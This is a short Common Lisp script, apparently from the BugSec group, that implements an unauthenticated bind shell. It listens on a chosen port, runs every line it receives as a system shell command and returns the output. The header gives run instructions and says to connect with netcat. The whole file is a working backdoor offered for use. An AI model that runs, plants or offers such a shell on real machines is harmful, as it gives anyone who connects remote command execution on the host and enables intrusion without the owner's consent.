#!/usr/bin/clisp
;
; SImple BinD ShELL in Common lisp
; v 0.1
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;
;author:Cooler_ && m0nad
;contact:c00f3r[at]gmail[dot]com
;
;Thanks _mlk_,I4K,,sigserv,belani
;my other friends
; delfo,nechist,muzgo,voidpointer,mysoft,garg,c4p4rz0,ephexis,backbone...
;
; http://code.google.com/p/bugsec/downloads/list
; BugSec.Com.br
; 
; follow this to run:
; clisp bindshell.lisp Port_number 
;on client:
; nc ip port
;
; if not run,you can fix with:
; apt-get install clisp cl-usocket
;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

(defun stream->string (stream)
  (with-output-to-string (s)
    (loop for line = (read-line stream nil nil)  
   while line do (write-line line s))))

(defparameter my-socket (socket-server (parse-integer (first ext:*args*))))
 (defparameter my-stream (socket-accept my-socket))
(loop
  if (setf *string* (read-line my-stream))
   do (setf *saida* (stream->string (run-shell-command *string* :output :stream)))
   and	
   do (princ *saida* my-stream)      
)
